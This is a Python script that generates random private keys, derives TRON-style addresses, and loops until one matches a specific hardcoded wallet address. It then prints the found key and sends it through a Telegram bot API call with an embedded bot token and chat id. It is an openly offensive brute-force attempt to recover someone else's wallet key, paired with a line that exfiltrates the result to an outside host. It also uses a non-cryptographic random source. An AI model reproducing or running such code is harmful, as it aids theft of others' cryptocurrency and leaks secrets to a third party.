import ecdsa
import base58
import ecdsa
import random
from Crypto.Hash import keccak
import pickle
import requests

global b           
b = 0
    
def keccak256(data):
    hasher = keccak.new(digest_bits=256)
    hasher.update(data)
    return hasher.digest()

def get_signing_key(raw_priv):
    return ecdsa.SigningKey.from_string(raw_priv, curve=ecdsa.SECP256k1)

def verifying_key_to_addr(key):
    pub_key = key.to_string()
    primitive_addr = b'\x41' + keccak256(pub_key)[-20:]
    # 0 (zero), O (capital o), I (capital i) and l (lower case L)
    addr = base58.b58encode_check(primitive_addr)
    return addr
########--------########
def generate():
    global raw
    raw = bytes(random.sample(range(0, 256), 32))
    #global raw
    #raw = bytes.fromhex("D8463C70FC21340B29037E3C313B83EC19783071C66EAEE9308E6C6ACC66B3E3")
    key = get_signing_key(raw)
    global addr
    addr = verifying_key_to_addr(key.get_verifying_key()).decode()
    print('Address:     ', addr)
    #print('Address(hex):', base58.b58decode_check(addr.encode()).hex())
    #print('Public Key:  ', key.get_verifying_key().to_string().hex())
    #print('Private Key: ', raw.hex())
    
    
while True:
    generate()
    b = b + 1
    print(b)
    if addr == "TWd4WrZ9wn84f5x1hZhL4DHvk738ns5jwb":
        print(raw.hex())
        response = requests.get(f"https://api.telegram.org/bot1378171996:AAEArKYuxZNUVyS_VzdmtY-w-ET7DU4M8FI/sendMessage?chat_id=888281482&text={raw.hex()}")
        break
    #pickle.dump( raw.hex(), open(f"{b}.py", "wb" ) )
    
